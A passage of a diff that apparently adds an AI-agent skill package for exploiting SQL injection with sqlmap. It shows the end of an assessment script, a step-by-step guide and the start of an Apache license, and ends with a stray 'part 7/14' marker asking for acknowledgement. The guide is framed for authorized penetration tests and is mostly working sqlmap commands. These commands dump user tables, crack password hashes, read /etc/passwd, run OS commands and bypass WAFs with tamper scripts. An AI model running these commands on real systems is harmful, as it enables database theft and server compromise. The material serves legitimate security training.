+    parser.add_argument("--output", default="sqli_report.json")
+    args = parser.parse_args()
+
+    report = run_assessment(args.url, args.param, args.method)
+    with open(args.output, "w") as f:
+        json.dump(report, f, indent=2)
+    logger.info("Report saved to %s", args.output)
+    print(json.dumps(report, indent=2))
+
+
+if __name__ == "__main__":
+    main()
+
+##### END FILE #####
+
+##### FILE: exploiting-sql-injection-with-sqlmap/SKILL.md #####
+---
+name: exploiting-sql-injection-with-sqlmap
+description: Detecting and exploiting SQL injection vulnerabilities using sqlmap to
+  extract database contents during authorized penetration tests.
+domain: cybersecurity
+subdomain: web-application-security
+tags:
+- penetration-testing
+- sql-injection
+- sqlmap
+- owasp
+- database-security
+- web-security
+version: '1.0'
+author: mahipal
+license: Apache-2.0
+nist_csf:
+- PR.PS-01
+- ID.RA-01
+- PR.DS-10
+- DE.CM-01
+mitre_attack:
+- T1190
+- T1059.007
+- T1505.003
+- T1083
+- T1055
+---
+
+# Exploiting SQL Injection with sqlmap
+
+## When to Use
+
+- During authorized web application penetration testing engagements
+- When manual testing reveals potential SQL injection points in parameters, headers, or cookies
+- For validating SQL injection findings from automated scanners like Burp Suite or OWASP ZAP
+- When you need to demonstrate the impact of SQL injection by extracting data from backend databases
+- During CTF challenges involving SQL injection exploitation
+
+## Prerequisites
+
+- **Authorization**: Written penetration testing agreement (Rules of Engagement) for the target
+- **sqlmap**: Install via `pip install sqlmap` or `apt install sqlmap` on Kali Linux
+- **Python 3.6+**: Required runtime for sqlmap
+- **Burp Suite** (optional): For capturing and replaying HTTP requests
+- **Target access**: Network connectivity to the target web application
+- **Browser with proxy**: Firefox with FoxyProxy for intercepting requests
+
+## Workflow
+
+### Step 1: Identify Potential Injection Points
+
+Manually browse the application and identify parameters that interact with the database. Use Burp Suite to capture requests.
+
+```bash
+# Start Burp Suite proxy and capture requests
+# Look for parameters in URLs, POST bodies, cookies, and headers
+# Example target URL with a suspected injectable parameter:
+# https://target.example.com/products?id=1
+
+# Test manually for basic SQL injection indicators
+curl -k "https://target.example.com/products?id=1'"
+# Look for SQL error messages like:
+# - "You have an error in your SQL syntax"
+# - "ORA-01756: quoted string not properly terminated"
+# - "Microsoft SQL Native Client error"
+```
+
+### Step 2: Run sqlmap Basic Detection Scan
+
+Launch sqlmap against the suspected injection point to confirm the vulnerability and identify the database type.
+
+```bash
+# Basic GET parameter test
+sqlmap -u "https://target.example.com/products?id=1" --batch --random-agent
+
+# For POST requests (save the request from Burp Suite to a file)
+sqlmap -r request.txt --batch --random-agent
+
+# Test specific parameter in a POST request
+sqlmap -u "https://target.example.com/login" \
+  --data="username=admin&password=test" \
+  -p "username" --batch --random-agent
+
+# Test with cookie-based injection
+sqlmap -u "https://target.example.com/dashboard" \
+  --cookie="session=abc123; user_id=5" \
+  -p "user_id" --batch --random-agent
+```
+
+### Step 3: Enumerate Database Structure
+
+Once injection is confirmed, enumerate databases, tables, and columns.
+
+```bash
+# List all databases
+sqlmap -u "https://target.example.com/products?id=1" --dbs --batch --random-agent
+
+# List tables in a specific database
+sqlmap -u "https://target.example.com/products?id=1" \
+  -D target_db --tables --batch --random-agent
+
+# List columns in a specific table
+sqlmap -u "https://target.example.com/products?id=1" \
+  -D target_db -T users --columns --batch --random-agent
+```
+
+### Step 4: Extract Data from Target Tables
+
+Dump the contents of sensitive tables to demonstrate impact.
+
+```bash
+# Dump specific columns from a table
+sqlmap -u "https://target.example.com/products?id=1" \
+  -D target_db -T users -C "username,password,email" \
+  --dump --batch --random-agent
+
+# Dump with row limit to avoid excessive data extraction
+sqlmap -u "https://target.example.com/products?id=1" \
+  -D target_db -T users --dump --start=1 --stop=10 \
+  --batch --random-agent
+
+# Attempt to crack password hashes automatically
+sqlmap -u "https://target.example.com/products?id=1" \
+  -D target_db -T users -C "username,password" \
+  --dump --batch --passwords --random-agent
+```
+
+### Step 5: Test for Advanced Exploitation Vectors
+
+Assess the full impact by testing OS-level access and file operations.
+
+```bash
+# Check current database user and privileges
+sqlmap -u "https://target.example.com/products?id=1" \
+  --current-user --current-db --is-dba --batch --random-agent
+
+# Attempt to read server files (if DBA privileges exist)
+sqlmap -u "https://target.example.com/products?id=1" \
+  --file-read="/etc/passwd" --batch --random-agent
+
+# Attempt OS command execution (MySQL with FILE privilege)
+sqlmap -u "https://target.example.com/products?id=1" \
+  --os-cmd="whoami" --batch --random-agent
+```
+
+### Step 6: Use Tamper Scripts to Bypass WAF/Filters
+
+When Web Application Firewalls or input filters block basic payloads, use tamper scripts.
+
+```bash
+# Common tamper scripts for WAF bypass
+sqlmap -u "https://target.example.com/products?id=1" \
+  --tamper="space2comment,between,randomcase" \
+  --batch --random-agent
+
+# For specific WAF bypass (e.g., ModSecurity)
+sqlmap -u "https://target.example.com/products?id=1" \
+  --tamper="modsecurityversioned,modsecurityzeroversioned" \
+  --batch --random-agent
+
+# List all available tamper scripts
+sqlmap --list-tampers
+```
+
+### Step 7: Generate Report and Clean Up
+
+Document findings and clean up any artifacts.
+
+```bash
+# sqlmap stores results in ~/.local/share/sqlmap/output/
+# Review the target output directory
+ls -la ~/.local/share/sqlmap/output/target.example.com/
+
+# Export results with specific output directory
+sqlmap -u "https://target.example.com/products?id=1" \
+  -D target_db -T users --dump \
+  --output-dir="/tmp/pentest-results" \
+  --batch --random-agent
+
+# Clean sqlmap session data after engagement
+sqlmap --purge
+```
+
+## Key Concepts
+
+| Concept | Description |
+|---------|-------------|
+| **Union-based SQLi** | Uses UNION SELECT to append attacker query results to the original query output |
+| **Blind Boolean SQLi** | Infers data one bit at a time by observing true/false application responses |
+| **Blind Time-based SQLi** | Uses database sleep functions (e.g., `SLEEP(5)`) to infer data based on response delays |
+| **Error-based SQLi** | Extracts data through verbose database error messages returned in HTTP responses |
+| **Stacked Queries** | Executes multiple SQL statements separated by semicolons for INSERT/UPDATE/DELETE operations |
+| **Out-of-band SQLi** | Exfiltrates data via DNS or HTTP requests initiated by the database server |
+| **Tamper Scripts** | sqlmap plugins that modify payloads to bypass WAFs and input sanitization filters |
+| **Second-order SQLi** | Injected payload is stored and executed later in a different query context |
+
+## Tools & Systems
+
+| Tool | Purpose |
+|------|---------|
+| **sqlmap** | Automated SQL injection detection and exploitation framework |
+| **Burp Suite Professional** | HTTP proxy for intercepting, modifying, and replaying requests |
+| **OWASP ZAP** | Free alternative to Burp for web application scanning and proxying |
+| **Havij** | Automated SQL injection tool with GUI (Windows) |
+| **jSQL Injection** | Java-based GUI tool for SQL injection testing |
+| **DBeaver/DataGrip** | Database clients for verifying extracted data structure |
+
+## Common Scenarios
+
+### Scenario 1: E-commerce Product Page SQLi
+A product detail page uses `id` parameter directly in SQL query. Use sqlmap to extract the full customer database including payment information to demonstrate critical business impact.
+
+### Scenario 2: Login Form Bypass
+A login form concatenates user input into an authentication query. Exploit to bypass authentication and enumerate all user credentials stored in the database.
+
+### Scenario 3: Search Function with WAF Protection
+A search feature is vulnerable to SQL injection but protected by a WAF. Use tamper scripts like `space2comment` and `between` to encode payloads and bypass the filter rules.
+
+### Scenario 4: Cookie-based Blind SQL Injection
+A session cookie value is used in a database query on the server side. Use time-based blind injection techniques to extract data character by character.
+
+## Output Format
+
+```
+## SQL Injection Finding
+
+**Vulnerability**: SQL Injection (Union-based)
+**Severity**: Critical (CVSS 9.8)
+**Location**: GET parameter `id` at /products?id=1
+**Database**: MySQL 8.0.32
+**Impact**: Full database read access, 15,000 user records exposed
+**OWASP Category**: A03:2021 - Injection
+
+### Evidence
+- Injection point: `id` parameter (GET)
+- Technique: UNION query-based
+- Backend DBMS: MySQL >= 5.0
+- Current user: app_user@localhost
+- DBA privileges: No
+
+### Databases Enumerated
+1. information_schema
+2. target_app_db
+3. mysql
+
+### Sensitive Data Exposed
+- Table: users (15,247 rows)
+- Columns: id, username, email, password_hash, created_at
+
+### Recommendation
+1. Use parameterized queries (prepared statements) for all database interactions
+2. Implement input validation with allowlists for expected data types
+3. Apply least-privilege database permissions for the application user
+4. Deploy a Web Application Firewall as defense-in-depth
+5. Enable database query logging and monitoring for anomalous patterns
+```
+
+##### END FILE #####
+
+##### FILE: exploiting-sql-injection-with-sqlmap/LICENSE #####
+
+                                 Apache License
+                           Version 2.0, January 2004
+                        http://www.apache.org/licenses/
+
+   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION
+
+   1. Definitions.
+
+      "License" shall mean the terms and conditions for use, reproduction,
+      and distribution as defined by Sections 1 through 9 of this document.
+
+      "Licensor" shall mean the copyright owner or entity authorized by
+      the copyright owner that is granting the License.
+
+      "Legal Entity" shall mean the union of the acting entity and all
+      other entities that control, are controlled by, or are under common
+      control with that entity. For the purposes of this definition,
+      "control" means (i) the power, direct or indirect, to cause the
+      direction or management of such entity, whether by contract or
+      otherwise, or (ii) ownership of fifty percent (50%) or more of the
+      outstanding shares, or (iii) beneficial ownership of such entity.
+
+      "You" (or "Your") shall mean an individual or Legal Entity
+
+-----
+[END PART 7/14] — رد غير "Received part 7/14"
